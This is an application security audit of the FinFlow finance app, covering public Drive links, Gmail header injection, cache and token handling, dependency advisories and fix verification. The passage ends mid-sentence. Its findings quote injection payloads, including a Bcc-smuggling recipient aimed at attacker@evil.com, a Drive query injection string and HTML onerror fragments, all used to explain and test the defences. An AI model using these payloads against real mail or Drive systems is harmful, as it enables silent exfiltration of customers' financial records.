# FinFlow — Security Audit Report

- **Date audited:** 2026-06-17
- **Auditor:** Vadim (application security)
- **Scope:** Full baseline application security review — Google OAuth & token handling, the Drive-as-database model (workspace isolation + public-read receipts/PDFs), the Gmail/WhatsApp delivery pipeline, secret/credential leakage, injection & output handling, dependency vulnerabilities, and prospective Capacitor/Android mobile surface.
- **Commit context:** branch `main`, working tree with uncommitted changes (see `git status`).
- **Overall risk verdict:** **High.** Two High-severity issues are exploitable today — public-read permissions on receipts and invoice PDFs expose customer PII / financial documents to anyone with a link, and the Gmail send path is vulnerable to email-header injection (silent Bcc exfiltration). Several Medium issues compound these (no logout data wipe, HTML-body XSS into recipient inboxes, tokens in `localStorage`, Drive query injection). No backend means some classes (secret storage) are architectural, not fixable in code.

---

## Executive summary

The highest-impact findings, in plain language:

1. **Every receipt image and invoice PDF is made "anyone with the link" readable on Google Drive.** These files contain customer names, tax IDs, addresses, amounts, and scanned receipts. The links are emailed/WhatsApped in cleartext and are permanent — anyone who ever sees a link (forwarded email, WhatsApp screenshot, message-history leak, browser history on a shared device) has unauthenticated, lasting access to that financial document. This is the single biggest exposure in the app.
2. **The "send invoice by email" feature lets a malicious or mistyped recipient value inject email headers.** The recipient field is free text and is dropped, unescaped and unvalidated, straight into the raw RFC-2822 message. A value containing a newline can add a `Bcc:` header and silently exfiltrate the invoice PDF to an attacker, or inject arbitrary additional recipients.
3. **Logout and account-switch do not clear the financial data cached in `localStorage`.** All expenses, invoices, clients, and business settings stay on the device after logout; the next person to use the browser (or the next Google account signed in) can read the previous user's financial records.
4. **Access tokens (with `drive.file` + `gmail.send` scope) live in `localStorage`,** readable by any successful XSS and persisted across sessions. Combined with the unescaped HTML email body (a stored-XSS-style sink into recipients' inboxes) this raises the blast radius.
5. **Dependencies:** `npm audit` reports 1 High (Vite, dev-server only) and 2 Moderate (`dompurify`, `tar` — transitive). None are in the production runtime path, but they should be patched.

---

## Findings

### F-1 — Receipts and invoice PDFs are world-readable on Drive (PII / financial-data exposure)
- **Severity:** **High** (impact: high — customer PII, tax IDs, amounts, scanned receipts; likelihood: high — happens automatically on every upload, links shared in cleartext).
- **Location:**
  - `src/services/googleDrive.ts:316-332` (`setPublicPermission` — `role: 'reader', type: 'anyone'`)
  - `src/services/googleDrive.ts:362` (applied to every uploaded invoice PDF)
  - `src/services/googleDrive.ts:404-406` (applied to every uploaded receipt)
- **Exploit scenario:** A freelancer uploads a receipt and sends an invoice. Both files get `anyone-with-link` reader permission and a `webViewLink`. The invoice link is sent over Gmail and WhatsApp (`src/services/gmail.ts:146`, `src/services/share.ts:64`). Anyone who later obtains that link — a forwarded email, a leaked WhatsApp chat, a shoulder-surfed screen, malware reading message history, or Google indexing if a link is ever pasted on the web — can open the PDF with no authentication. The PDF contains the business's and the customer's tax IDs, address, line items, and totals (`src/services/pdf/InvoiceTemplate.tsx:64-125`). Receipts are even more sensitive (raw supplier documents). Access is permanent — the app never revokes the permission. Drive file IDs are not guessable, so this is link-disclosure, not enumeration, but the links are deliberately distributed.
- **Recommended fix:**
  - Preferred: do **not** set `type: 'anyone'`. The whole point of the OAuth `gmail.send` scope is that the app emails the PDF as an **attachment** (it already does — `gmail.ts:62-66`), so the public Drive link is redundant for the email path. Drop the public link from the email body, or replace the "View online" link with the attachment only.
  - If a shareable link is genuinely required (WhatsApp has no attachment), scope the permission tighter: share to the specific recipient's Google identity (`type: 'user', emailAddress`) where known, and/or generate the permission on-demand with an expiry the app revokes after a window. Document that `type: 'anyone'` is a deliberate, reviewed exception if it must stay.
  - The original justification ("avoid *You need access* across multiple Google logins") is a UX problem, not a reason to publish financial PII — solve it with per-recipient sharing, not world-read.
- **Hand to `alex`:** Yes — change request: remove `type: 'anyone'` default; make the email path attachment-only (no public link); for WhatsApp, gate public sharing behind an explicit per-invoice user action with the narrowest permission possible.

### F-2 — Email header injection in the Gmail send path (silent PDF exfiltration)
- **Severity:** **High** (impact: high — silent exfiltration of financial PDFs / arbitrary mail from the user's account; likelihood: medium — requires a crafted/mistyped recipient or a compromised client record).
- **Location:**
  - `src/services/gmail.ts:53` — `To: ${params.to}` interpolated raw into the MIME message
  - `src/services/gmail.ts:51-70` — headers joined with `\r\n`, so a CR/LF in `to` starts a new header
  - `src/components/SendInvoiceModal.tsx:84` (`to: email.trim()`), `:77-78` (only an `email.trim()` truthiness check — no format validation; `type="email"` on the input at `:169` is **not** enforced on programmatic send)
- **Exploit scenario:** The recipient field accepts any string. A value like `victim@example.com\r\nBcc: attacker@evil.com` produces a MIME blob where the attacker's address becomes a real `Bcc`, so the invoice PDF (containing the customer's PII) is silently copied to the attacker. Because the recipient defaults from the client record (`SendInvoiceModal.tsx:31`), a tampered `app_data.json` (which is fully user/attacker-editable in Drive — see F-7) or a shared/compromised client entry can carry the payload so the user never sees it. The same newline trick can inject `Subject`, additional `To`, or break the body boundary. The subject is RFC-2047 encoded (`:30`) so it's safe, but `To` is not.
- **Recommended fix:**
  - Validate the recipient is a single, well-formed email with **no** CR/LF/control characters before building the MIME (reject anything matching `/[\r\n]/` and anything that isn't a valid single address).
  - Defense-in-depth: strip CR/LF from every interpolated header value in `buildMimeMessage`.
- **Hand to `alex`:** Yes — add strict recipient validation in `SendInvoiceModal.handleSendEmail` and a header-sanitization guard in `gmail.ts`.

### F-3 — Logout / account-switch does not clear cached financial data (and tokens persist by default)
- **Severity:** **Medium** (impact: high on a shared device — full financial dataset of the prior user; likelihood: medium).
- **Location:**
  - `src/context/AuthContext.tsx:137-152` (`logout` removes only `auth_user`/`auth_token`/`auth_expiry`)
  - `src/context/FinanceContext.tsx:386-391` (writes `finance_expenses`, `finance_clients`, `finance_invoices`, `finance_booking_agents`, `finance_business_settings` to `localStorage`)
  - No code clears the `finance_*` keys on logout (confirmed: only `finance_active_business` is removed, and only when deleting the last workspace — `FinanceContext.tsx:763`).
- **Exploit scenario:** User signs out on a shared/public computer. `auth_*` is cleared but `finance_invoices`, `finance_clients` (customer PII), `finance_expenses` remain in `localStorage` in plaintext. The next person opens DevTools (or the app, which hydrates from these keys at `FinanceContext.tsx:281-287`) and reads the prior user's full financial records. Account-switch has a related leak window: the new session hydrates from the previous user's cached `finance_*` until the Drive fetch completes.
- **Recommended fix:** On `logout`, remove all `finance_*` keys (or `localStorage.clear()` after capturing anything that must survive). On detecting a different signed-in account, purge the `finance_*` cache before hydrating. Consider not caching full PII datasets in `localStorage` at all, or gating it behind an explicit "remember on this device" choice.
- **Hand to `alex`:** Yes — extend `logout` to clear `finance_*`; purge cache on account change.

### F-4 — Unescaped untrusted content in the HTML email body (HTML/markup injection into recipient inboxes)
- **Severity:** **Medium** (impact: medium — markup/link injection rendered in a third party's email client; likelihood: medium).
- **Location:** `src/services/gmail.ts:80-155` (`buildHtmlBody`) — `item.description` (`:87`), `params.businessName` (`:103`), and `params.driveUrl` (`:146`, inside `href`) are interpolated into HTML with no escaping. `Content-Type: text/html` is set at `:58`.
- **Exploit scenario:** An invoice line description or business name containing HTML (e.g. `<a href=...>`, `<img src=... onerror=...>`, or a crafted `"><...>` to break out of the `href`) is sent as live HTML to the recipient. Most modern mail clients strip scripts, so this is unlikely to be full JS execution in the recipient's client, but it enables convincing phishing links/branding spoofing inside a legitimately-sent FinFlow invoice, and content/attribute-injection into the `href`. The same untrusted strings render into the on-screen DOM and the PDF template; React auto-escapes JSX (`InvoiceTemplate.tsx`), so the in-app/PDF path is safe — the email HTML path is the gap.
- **Recommended fix:** HTML-escape every interpolated value in `buildHtmlBody` (`& < > " '`). Validate/encode `driveUrl` as a URL and ensure it's an `https://` Drive URL before placing it in `href`. A small escape helper is sufficient; the project already pulls in `dompurify` transitively if a library is preferred.
- **Hand to `alex`:** Yes — add HTML-escaping to `buildHtmlBody`.

### F-5 — OAuth access tokens stored in `localStorage`
- **Severity:** **Medium** (impact: high — token grants Drive + Gmail send; likelihood: low-medium, contingent on an XSS or local access).
- **Location:** `src/context/AuthContext.tsx:95-96`, `src/services/auth.ts:161-162` (token + 1h expiry written to `localStorage`); read throughout (`auth.ts:149-150`, `AuthContext.tsx:31`).
- **Exploit scenario:** `localStorage` is readable by any JavaScript in the origin. Any XSS (see F-4 for an injection sink, and the unescaped-data theme generally) or a malicious dependency can read `auth_token` and use it directly against Drive and Gmail (scopes include `gmail.send`, so an attacker could send mail as the user). Tokens also persist on disk on shared devices. There is no httpOnly-cookie option here because there is no backend (architectural — see Out of scope).
- **Recommended fix:** Given the no-backend constraint, `localStorage` is hard to avoid for web. Mitigations: keep the access token in memory only (React state) and rely on the plugin's silent refresh (`getValidAccessToken` already supports refresh) instead of persisting it; on native, store via Capacitor secure storage / Android Keystore rather than WebView `localStorage`. At minimum, shorten persisted lifetime and clear on logout (overlaps F-3). Reducing scope (F-9) limits the damage if a token leaks.
- **Hand to `alex`:** Partial — the in-memory-token refactor is a code change for `alex`; the secure-native-storage decision needs an architecture call (Out of scope item).

### F-6 — Google Drive query injection via unescaped names
- **Severity:** **Medium** (impact: medium — broken/altered Drive queries; likelihood: medium for breakage, low for cross-data impact since it's the user's own Drive).
- **Location:** `src/services/googleDrive.ts:56` — `name = '${name}'` interpolated into the Drive `q` parameter; `name` comes from user-controlled business names (`createBusiness`, `AppLayout.tsx:74`), receipt vendor/date/filename (`uploadReceiptToDrive:384`), and `findFileId` callers generally.
- **Exploit scenario:** A business name or vendor containing a single quote (e.g. `O'Brien`, or `' or '1'='1`) breaks the query string syntax or alters the predicate. Within Drive's query language this can cause the lookup to fail (DoS / corrupted workspace resolution — the app might fail to find or wrongly match a folder) or, with a crafted value, broaden the match within the user's own Drive. Cross-user impact is bounded because every query runs against the authenticated user's own Drive with their token. Still a correctness/robustness and injection-hygiene issue and an unvalidated-input class to close.
- **Recommended fix:** Escape single quotes (and backslashes) in any value interpolated into a Drive `q` (`name.replace(/\\/g, '\\\\').replace(/'/g, "\\'")`), or validate/reject names containing quotes and control characters at input time. Apply to `findFileId`, `listBusinesses`, and the upload helpers.
- **Hand to `alex`:** Yes — add a `q`-value escaper used by all Drive name lookups.

### F-7 — `app_data.json` is parsed and trusted without validation
- **Severity:** **Medium** (impact: medium — drives the injection sinks above; likelihood: medium — the file is fully user-editable, and merge logic trusts it).
- **Location:** `src/services/googleDrive.ts:173-179` (`fetchAppState` returns `response.json()` with no schema check); consumed at `src/context/FinanceContext.tsx:338-357`; merged untrusted in `mergeAppState` (`googleDrive.ts:229-238`). Also `FinanceContext.tsx:281-287` `JSON.parse` of `localStorage`.
- **Exploit scenario:** The "database" is a JSON file in the user's own Drive that the user (or anything with write access to that Drive folder, e.g. a shared workspace or a Drive-resident attacker) can edit freely. Tampered values flow unvalidated into: the email `To`/`Bcc` (F-2, via client records), the HTML email body and PDF (F-4), Drive queries (F-6), and financial math. There is no `Object.prototype`/`__proto__` stripping on `JSON.parse`, no type/shape validation, and no bounds checking on numbers. Because there is no server, this file is the trust boundary and it is currently trusted implicitly.
- **Recommended fix:** Validate `app_data.json` against a schema on load (e.g. zod or hand-rolled guards): correct types, expected fields, sane numeric bounds, no unexpected keys; drop/repair invalid records rather than feeding them downstream. Strip `__proto__`/`constructor` keys when parsing remote/cached JSON. This single control hardens F-2/F-4/F-6 at the source.
- **Hand to `alex`:** Yes — add load-time validation/sanitization of `AppState`.

### F-8 — `window.open` without `noopener` for the WhatsApp deep link
- **Severity:** **Low** (impact: low — reverse-tabnabbing; likelihood: low).
- **Location:** `src/services/share.ts:86` — `window.open(url, '_blank')` with no `noopener,noreferrer`.
- **Exploit scenario:** The opened `wa.me` page receives a `window.opener` reference and could (in principle, for a malicious destination) navigate the FinFlow tab. `wa.me` is trusted, so risk is low, but the message text is user-controlled and `encodeURIComponent`-encoded (`:85`, good — no injection there). Hardening only.
- **Recommended fix:** `window.open(url, '_blank', 'noopener,noreferrer')`.
- **Hand to `alex`:** Optional — trivial hardening.

### F-9 — OAuth scope breadth (`gmail.send`) and token reuse for both Drive and Gmail
- **Severity:** **Low/Info** (impact: raises blast radius of a leaked token; likelihood: n/a — design observation).
- **Location:** `src/services/auth.ts:62-67` — requests `drive.file` + `gmail.send` together; the single token is reused for all calls (`gmail.ts:171`, all of `googleDrive.ts`).
- **Notes:** `drive.file` is appropriately narrow (only app-created files — good). `gmail.send` is sensitive: a leaked token (F-5) can send mail as the user. This is functionally required for the email feature, so it's a documented tradeoff, not a defect — but it makes F-2/F-4/F-5 worse and is worth a conscious decision. Confirm the Google Cloud OAuth consent screen and verification status match these scopes.
- **Recommended fix:** Keep scopes minimal (they are). Consider requesting `gmail.send` incrementally only when the user first sends an email, rather than at initial login, so most sessions hold a Drive-only token.
- **Hand to `alex`:** Optional — incremental authorization is a code change if you want it.

### F-10 — Verbose console logging of auth/sync internals
- **Severity:** **Info.**
- **Location:** `src/services/auth.ts:30,36,167`; `src/services/googleDrive.ts:63,95,116,330`; `src/context/FinanceContext.tsx:453`. The token itself is **not** logged (good — `auth.ts:167` logs the error object, not the token), but login status, Drive API errors, and sync state are. In a client SPA these are visible in the user's own console only.
- **Recommended fix:** Strip or gate debug logging behind a dev flag for production builds to avoid leaking operational detail and to keep error responses (which can carry Drive metadata) out of the console.
- **Hand to `alex`:** Optional.

---

## Dependency / advisory notes

`npm audit` on 2026-06-17 — **3 vulnerabilities (1 high, 2 moderate):**

| Package | Severity | Range affected | Issue | Fix |
|---|---|---|---|---|
| `vite` | High | `8.0.0 – 8.0.15` (installed `^8.0.12`) | `server.fs.deny` bypass on Windows alt-paths; transitive `launch-editor` NTLMv2 hash disclosure on Windows | Upgrade to the patched Vite 8.0.x. **Dev-server only** — not shipped in the production bundle; risk is to the developer's machine, primarily on Windows. |
| `dompurify` | Moderate | `<= 3.4.8` | `IN_PLACE`-mode XSS / DEFAULT_ALLOWED pollution | Transitive (pulled via a build/runtime dep, not directly imported by app code). Upgrade transitive to `> 3.4.8`. Note: app does **not** currently use DOMPurify for the email body — if you adopt it for F-4, pin a fixed version. |
| `tar` | Moderate | `<= 7.5.15` | PAX header parser file-smuggling differential | Transitive (tooling). Upgrade to `> 7.5.15`. |

Action: run `npm audit fix` (and verify Vite minor bump doesn't break the build). None of the three are in the production runtime request path, so none are independently exploitable against an end user — but patch them to reduce supply-chain/dev-machine risk. Re-run `npm audit` before each release; advisories change frequently.

Other dependency observations: production runtime deps (`react 19`, `react-router 7`, `jspdf 4`, `html2canvas`, `recharts`, `i18next`, `@capgo/capacitor-social-login 8`) had no flagged advisories at audit time. Confirm again at release.

---

## Secrets / credential review (no leak found)

- `.env.local` is **gitignored and not tracked** (verified `git ls-files`), and contains only `VITE_GOOGLE_CLIENT_ID` — a **public** OAuth Web client ID, not a secret. There is **no** client secret in the repo, bundle, or config (correct for a public SPA/OAuth-PKCE client). The client ID being baked into `dist/` (`apps.googleusercontent.com` present) is expected and not a finding.
- No hardcoded API keys, `GOCSPX-` client secrets, or credentials found in tracked files.
- `git grep` for `client_secret|api_key|secret|GOCSPX` returned nothing sensitive.

---

## Mobile (Capacitor / Android) — prospective

The `android/` (and `ios/`) directories are gitignored and not generated in this checkout, so the native projects could not be audited directly. Based on `capacitor.config.ts` and the web code, flag these for the mobile build review:

- **WebView config:** no `server.allowNavigation`, `server.cleartext`, or `allowMixedContent` set in `capacitor.config.ts` (good — defaults are secure). When the Android project is generated, verify `android:usesCleartextTraffic` is **false** and there is no permissive `network_security_config.xml`.
- **Token storage on native:** `localStorage` in the Android WebView is not encrypted at rest. The token-in-`localStorage` issue (F-5) is worse on a rooted/backed-up device — use Capacitor Preferences with secure storage / Android Keystore for the token on native.
- **Deep links / exported components:** no custom URL scheme or `intent-filter` is configured in `capacitor.config.ts`; the social-login plugin will register its own OAuth redirect handling — verify the generated `AndroidManifest.xml` does not export activities unnecessarily and that the OAuth redirect intent is not hijackable (use an app-specific scheme / App Links with verification).
- **Debuggable builds:** ensure release APKs are built with `android:debuggable="false"` and minification/R8 enabled.
- **`appId` `com.finflow.app`** — fine; confirm it matches the registered OAuth Android client and SHA fingerprints.

These are advisory until the native project is available; re-audit once `android/` is generated.

---

## Out of scope / needs an architecture decision

- **No backend = client-held secrets and trust boundary on the user's Drive.** With no server, (a) the access token must live somewhere the JS can read it (F-5 can be mitigated but not eliminated for web), and (b) `app_data.json` is an inherently user-controlled, tamperable data store (F-7) — the app can validate it but can never *trust* it. Decide whether these limits are acceptable for handling tax IDs / PII, or whether a thin backend (token broker + server-side Drive/Gmail proxy + signed share links) is warranted. This is the root architectural call behind F-1, F-2, F-5, and F-7.
- **Public-link sharing vs. UX (F-1):** removing `type: 'anyone'` may reintroduce the "need access" friction the comment describes for multi-account users on the WhatsApp path. Decide the acceptable tradeoff (per-recipient sharing, expiring links, or attachment-only).
- **Gmail `gmail.send` scope (F-9):** product decision on whether to keep it at login vs. incremental, and to confirm Google OAuth app verification covers it.
- **Native projects (Android/iOS):** not present in this checkout; mobile findings are prospective and need a pass once generated.

---

## Suggested remediation order

1. **F-1** (public Drive permissions) and **F-2** (email header injection) — both High, both exploitable now.
2. **F-3** (logout cache wipe) and **F-4** (email HTML escaping) — quick, high-value.
3. **F-7** (validate `app_data.json`) — hardens F-2/F-4/F-6 at the source.
4. **F-6** (Drive `q` escaping), **F-5** (token handling), dependency `npm audit fix`.
5. **F-8/F-9/F-10** — hardening.

---

## Fix Verification (2026-06-17)

Re-verified the fixes implemented in commit `dc84820` ("security: harden auth, Drive/Gmail
integration and local cache") against the findings above. Verdict per finding, with the
code evidence that closes it (or what remains). Line numbers are the current `main` tree.

| Finding | Severity | Verdict |
|---|---|---|
| F-1 Public-read receipts/PDFs | High | **CLOSED** |
| F-2 Email header injection | High | **CLOSED** |
| F-3 Logout/account-switch cache wipe | Medium | **CLOSED** |
| F-4 Unescaped HTML email body | Medium | **CLOSED** |
| F-5 Tokens in `localStorage` | Medium | **OPEN** (unchanged — architectural) |
| F-6 Drive `q` injection | Medium | **CLOSED** |
| F-7 `app_data.json` trusted blindly | Medium | **CLOSED** |
| F-8 `window.open` no `noopener` | Low | **CLOSED** (bonus) |
| F-9 OAuth scope breadth | Low/Info | **OPEN** (unchanged — design decision) |
| F-10 Verbose logging | Info | **OPEN** (unchanged) |

### F-1 — CLOSED
`setPublicPermission` is **deleted entirely** (`git grep` for `type: 'anyone'` /
`setPublicPermission` returns nothing in `src/`). `uploadInvoicePDF` and
`uploadReceiptToDrive` no longer call it (`googleDrive.ts:373`, `:412-416`). The email path
no longer embeds a public link — the body now says "The invoice PDF is attached"
(`gmail.ts`), and `driveUrl` was removed from `SendInvoiceEmailParams` and from the modal
call (`SendInvoiceModal.tsx:89-103`). The WhatsApp path now shares the **actual PDF file**
(native share sheet / Web Share API / local download fallback) instead of a Drive link
(`share.ts:117-169`), and the link line was removed from the message body (`share.ts:69-75`).
Uploaded files are now owner-private. **Exposure vector eliminated.**

### F-2 — CLOSED
Defense in depth on three layers:
1. UI boundary: `SendInvoiceModal.handleSendEmail` validates with `isValidEmailAddress`
   before doing any work (`SendInvoiceModal.tsx:78-86`).
2. Service boundary: `sendInvoiceEmail` re-validates and throws `INVALID_RECIPIENT`
   (`gmail.ts:202-205`), so the guard holds even if the call path changes.
3. Header sink: `buildMimeMessage` wraps the `To:` value in `sanitizeHeaderValue`, which
   strips CR/LF and all control chars (`gmail.ts` `To:` line).
`isValidEmailAddress` rejects CR/LF, control chars, commas/semicolons/whitespace, and
anything that isn't a single `local@domain.tld` (`gmail.ts`). Verified against the
canonical payload `victim@example.com\r\nBcc: attacker@evil.com` — rejected. The `Subject`
was already RFC-2047 encoded. **A tampered client record (F-7 path) can no longer smuggle a
Bcc.**

### F-3 — CLOSED
- Central key list + `clearFinanceCache()` in new `src/utils/financeCache.ts` (single source
  of truth — producer and wipers can't drift).
- Logout calls `clearFinanceCache()` (`AuthContext.tsx:170-173`) AND `FinanceContext` runs a
  flush-then-wipe effect on the auth `true->false` transition: it best-effort saves unsynced
  edits to Drive, then clears the cache and resets all in-memory state to defaults
  (`FinanceContext.tsx:464-507`). This also closes the previously-noted data-loss risk of a
  logout inside the 1s save debounce.
- Account-switch: `login` reads the *previous* `auth_user` email **before** it is overwritten
  (read at `AuthContext.tsx:82-83`, overwrite at `:99`) and purges the cache if the new email
  differs, with a fail-safe `clearFinanceCache()` in the catch (`:85-92`). Hydrate-from-cache
  therefore can't surface the prior user's data.
- **Minor residual (Low):** the account-switch guard relies on `result.profile.email`. If the
  plugin returns a token without a profile (fallback path, `AuthContext.tsx:103-106`),
  `newEmail` is undefined and the switch guard does not fire. The explicit-logout wipe still
  covers the normal sign-out-then-sign-in flow, so this is a narrow edge, not a reopening of
  F-3. Optional hardening: clear the cache whenever `previousEmail` exists and `newEmail`
  can't be confirmed.

### F-4 — CLOSED
`escapeHtml` (`& < > " '`) is applied to every dynamic value in `buildHtmlBody`:
`item.description`, `businessName`, `invoiceId`, `date`, `dueDate`, and `total`
(`gmail.ts:128-186`). The `driveUrl` `href` — the worst sink, allowing attribute breakout —
was **removed entirely** (now static "attached" text), so there's no untrusted URL in an
`href` anymore. `formatILS`/numeric fields are app-generated. No remaining raw interpolation
of untrusted strings into the HTML body.

### F-5 — OPEN (unchanged, architectural)
Access tokens (Drive + `gmail.send`) are still written to and read from `localStorage`
(`AuthContext.tsx:113-114`; `auth.ts`). This commit did not attempt the in-memory-token
refactor or native secure storage; it remains the documented no-backend tradeoff (see Out of
Scope). Blast radius is now **reduced** because the primary XSS sink that fed it (F-4 HTML
body) is closed, but the finding itself is not addressed. Still recommended for `alex`/arch
decision: keep the access token in memory + silent refresh on web; use Capacitor secure
storage / Keystore on native.

### F-6 — CLOSED
`escapeDriveQueryValue` escapes backslash then single-quote and strips control chars
(`googleDrive.ts:53-69`), and `findFileId` routes the name through it
(`googleDrive.ts` `q` construction). All name-based lookups (`listBusinesses`,
`createBusiness`, receipt/invoice folder resolution) go through `findFileId`, so they inherit
the escaping. Verified `O'Brien` and `' or '1'='1` are neutralized into a quoted literal.

### F-7 — CLOSED
New `src/utils/appStateSchema.ts` `normalizeAppState()`:
- `stripDangerousKeys` recursively removes `__proto__`/`constructor`/`prototype`
  (prototype-pollution guard) before any field is touched.
- Per-record normalizers coerce types, drop records missing an `id`, whitelist all enum
  fields (business/document/payment/VAT/status), and clamp amounts to finite, non-negative
  numbers (no NaN/Infinity/negative totals reaching the math).
Applied at **both** untrusted entry points: Drive load (`fetchAppState`,
`googleDrive.ts:199-200`, with a `.catch(() => ({}))` so malformed JSON degrades to defaults)
and the localStorage cache hydrate (`FinanceContext.tsx:300`). `mergeAppState` consumes the
already-normalized remote state, so the merge path is covered too. This hardens F-2/F-4/F-6
at the source as intended.
- **Legacy-data check:** normalization is *lenient* (defaults missing fields, keeps records
  with valid `id`), so legitimate older `app_data.json` is preserved rather than rejected —
  no false-positive data loss. The one behavioral change to note: a `paymentLine` with
  `amount <= 0` is dropped (`appStateSchema.ts` `normalizePaymentLine`), and an expense/
  client/invoice/agent with no `id` is dropped — acceptable, as such records are unusable,
  but worth flagging if any legacy export relied on id-less rows.

### F-8 — CLOSED (bonus, not in original remediation scope of the commit)
All `window.open` calls for `wa.me` now pass `'noopener,noreferrer'` (`share.ts:164,167`).

### F-9 / F-10 — OPEN (unchanged)
Scope breadth (`drive.file` + `gmail.send` at login) and verbose console logging were not
touched by this commit. Both remain Low/Info hardening items as originally rated.

### New issues / regressions introduced by the fix — none material
- **Email regex (over-rejection check):** tested against real-world addresses — plus-tags
  (`user+tag@gmail.com`), subdomains, multi-label TLDs (`a@sub.example.co.il`), hyphenated
  domains, and unicode local parts (`José@example.com`) all **pass**; injection/multiples
  **fail**. The only rejections are `name@localhost` (no dotted TLD) and quoted local parts —
  not relevant for client invoice emails. No over-aggressive regression.
- **Schema bypass check:** entry points covered (Drive + cache + merge); no path feeds raw
  remote JSON downstream. Prototype-pollution payloads are stripped recursively. No bypass
  found.
- **Cache-purge coverage check:** `FINANCE_CACHE_KEYS` covers every key the persistence
  effect writes (`FinanceContext.tsx:415-...`), incl. `finance_active_business`. No missed
  key. (Note: `finance_categories` is in the wipe list and is written by the persistence
  effect — consistent.)
- **Share path (new code) note (Low):** `share.ts` writes the PDF to `Directory.Cache` with
  `path = invoice_${invoice.id}.pdf`. `invoice.id` is app-generated (sequence/uuid), so path
  traversal via the filename is not a practical concern, but if invoice IDs ever become
  user-settable, sanitize the filename. The local-download fallback (`share.ts:150-159`) is
  standard and revokes the object URL. No new exposure.

### Dependency check (2026-06-17, live)
- **New deps added by this commit:** `@capacitor/share@8.0.1` and
  `@capacitor/filesystem@8.1.2`. Both are the latest published versions
  (`npm view`: share modified 2026-06-16, filesystem 2026-05-05) and both have **zero**
  GitHub security advisories (queried the GitHub Advisory REST API
  `api.github.com/advisories?ecosystem=npm&affects=<pkg>` — returned empty for both).
  Transitive `@capacitor/synapse@1.0.4` — no advisories. **Clean.**
- **Pre-existing `npm audit` (unchanged by this commit):** still **3 vulns (1 high, 2
  moderate)** — `vite` (High, dev-server only, Windows), `dompurify` (Moderate, transitive;
  the app's F-4 fix uses a hand-rolled escaper, *not* DOMPurify, so this is not in the runtime
  path), `tar` (Moderate, tooling). None in the production request path. `npm audit fix` is
  still outstanding and recommended before release.
  - Advisory refs: DOMPurify `<=3.4.8` (GHSA-x4vx-rjvf-j5p4 et al.); node-tar `<=7.5.15`
    (GHSA-vmf3-w455-68vh); Vite `8.0.0–8.0.15` (GHSA-fx2h-pf6j-xcff, GHSA-v6wh-96g9-6wx3).

### Remaining HIGH/CRITICAL exposure on the core surface
After this commit there is **no remaining High or Critical** finding that is exploitable as
originally described:
- The two Highs (F-1 public links, F-2 header injection) are **closed**.
- Remaining items are Medium-or-lower and either architectural (F-5 token storage, the
  no-backend trust model) or hardening (F-9 scope, F-10 logging). F-5 is the highest residual
  and is gated on the backend/secure-native-storage architecture decision in Out of Scope.

**Updated overall risk verdict: Medium** (was High). The exploitable PII-exposure and
exfiltration paths are remediated; residual risk is dominated by client-side token storage
inherent to the no-backend design.

---

## Residual-Fix Verification (2026-06-17)

Verified Alex's **uncommitted** working-tree changes against baseline `3ec3f43`
(`git diff 3ec3f43 -- src/`; new file `src/config/defaults.ts`). These close the three
residuals flagged in the Fix-Verification pass above. Line numbers are the current tree.

| Residual | Prior state | Verdict |
|---|---|---|
| R1 — Attachment filename header injection (F-2 follow-up) | PARTIAL (filename used raw id) | **CLOSED** |
| R2 — Account-switch cache purge fail-safe (F-3 follow-up) | PARTIAL (skip on missing email) | **CLOSED** |
| R3 — Authenticated receipt preview (F-1 follow-up) | OPEN (cookie-auth iframe, broke for owner-private files) | **CLOSED** |

### R1 — Attachment filename header injection — CLOSED
Two-layer defense, sink + source:
- **Sink:** `buildMimeMessage` now runs the filename through `sanitizeQuotedHeaderParam`
  (`gmail.ts:102`), which composes `sanitizeHeaderValue` (strips CR/LF + `\x00-\x1f\x7f`,
  `gmail.ts:42-45`) with a `"` strip (`gmail.ts:54-56`). The sanitized `filename` is what
  lands in both `Content-Type: ...; name="${filename}"` and
  `Content-Disposition: attachment; filename="${filename}"` (`gmail.ts:120-121`). A tampered
  id can no longer close the quoted-string (`"` removed) nor start a new header (CR/LF
  removed). The `To:` value is likewise wrapped in `sanitizeHeaderValue` (`gmail.ts:110`),
  and `Subject` stays RFC-2047 base64-encoded (`gmail.ts:103`), so every header line is
  neutralized.
- **Source:** `normalizeInvoice` now coerces the id via `toSafeId`
  (`appStateSchema.ts:201-204`), which strips `[\r\n\x00-\x1f\x7f"]` from any id read out of
  the untrusted `app_data.json` (`appStateSchema.ts:90-93`). So the value is safe before it
  ever reaches the sink.
- **No remaining raw-id path into headers:** `params.invoiceId` is the only id that flows
  into `buildMimeMessage`; it originates from `invoice.id` (normalized) via
  `SendInvoiceModal` -> `sendInvoiceEmail` -> `buildMimeMessage`. The id also reaches the
  HTML body (`Invoice ${escapeHtml(params.invoiceId)}`, `gmail.ts:161`) where it is
  HTML-escaped. Confirmed against payloads `INV"\r\nBcc: a@b.co` and
  `1"; name="x.html` — both reduced to inert characters at the sink, and stripped at the
  source. **Closed.**

### R2 — Account-switch cache purge fail-safe — CLOSED
The guard is now inverted to keep-on-confirmed-same-account (`AuthContext.tsx:90-95`):
```
if (previousEmail) {
  const sameConfirmedAccount = !!newEmail && newEmail === previousEmail;
  if (!sameConfirmedAccount) clearFinanceCache();
}
```
The prior `finance_*` cache is now wiped in every case where a previously-cached account
exists EXCEPT a confirmed same-account login (new profile email present AND byte-equal). The
specific gap noted before — a silent/native re-auth that returns no/empty `profile.email`
leaves `newEmail` undefined — now triggers the purge (`!!newEmail` is false ->
`sameConfirmedAccount` false -> clear). The `catch` still fail-safe-clears on any parse error
(`AuthContext.tsx:96-100`). `previousEmail` is read **before** `auth_user` is overwritten
(read `:87-88`, overwrite `:107`), so the comparison uses the genuine prior identity.
- **Over-purge check (new-issue probe):** on a *first-ever* login `previousEmail` is
  undefined, so the outer `if` is skipped and nothing is cleared — no spurious wipe of a
  fresh session. On a confirmed same-account re-login the cache is correctly retained.
  The only "extra" purges versus the old logic are exactly the unconfirmable cases, which is
  the intended fail-safe — purging a cache that may belong to a different user is the correct,
  data-loss-free choice (the cache is a non-authoritative mirror of Drive and is re-hydrated
  from Drive after login). No legitimate-data-loss regression. **Closed, no new issue.**

### R3 — Authenticated receipt preview — CLOSED
The cookie-auth `drive.google.com/file/d/<id>/preview` iframe and the public "Open
Directly"/`webViewLink` links are **removed** from `ExpensesView` (the `ExternalLink` import
and both link buttons are gone in the diff). Replacement flow:
- `extractDriveFileId(receiptUrl)` -> `downloadDriveFileBlob(token, fileId)` fetches the raw
  bytes with `Authorization: Bearer <token>` against the hardcoded
